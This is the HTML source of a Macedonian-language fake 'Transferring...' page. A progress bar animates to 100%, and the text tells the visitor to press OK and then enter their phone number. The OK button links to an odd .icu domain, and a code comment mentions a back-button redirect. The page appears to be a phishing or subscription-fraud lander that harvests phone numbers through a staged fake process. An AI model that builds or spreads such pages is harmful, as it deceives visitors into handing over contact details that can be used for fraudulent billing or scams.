<body class="">
    <div id="app">
        <center class="wrapper">
            <div class="container">
                <div class="title">Префрлање...</div>
                <div class="progress-bar-wrapper">
                    <div id="progress-bar">
                        <div class="progress-bar-filling"></div>
                    </div>
                    <div class="progress-bar-percent">100%&nbsp;</div>
                </div>
                <div class="txt">Доколку префрлањето не ѕапочне автоматски</div>
                <div class="desript">
                    <div class="s1">Чекор 1: притиснете ОК за да го завршите префрлувањето</div>
                    <div class="s2">Чекор 2: внесете го Вашиот телефонски број</div>
                </div>
                <div class="btnwrap addToCartButton">
                    <a href="https://pields-ladayeast.icu/click">
                        <div class="btn">OK</div>
                    </a>
                </div>
            </div>
        </center>
    </div>

  <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>

    <script type="text/javascript">
    // back button redirect //// end //
    $(document).ready(function() {
        function progress(percent, $element) {
            var progressBarWidth = percent * $element.width() / 100;
            $element.find('.progress-bar-filling').animate({
                width: progressBarWidth
            }, 10000)
            //.html(percent + "%&nbsp;");
            jQuery({
                Counter: 0
            }).animate({
                Counter: 100
            }, {
                duration: 10000,
                easing: 'swing',
                step: function() {
                    $('.progress-bar-percent').html(Math.ceil(this.Counter) + "%&nbsp;");
                }
            });
        }
        var complete = 100;
        progress(complete, $('#progress-bar'));
    });
    
    </script>

</body>
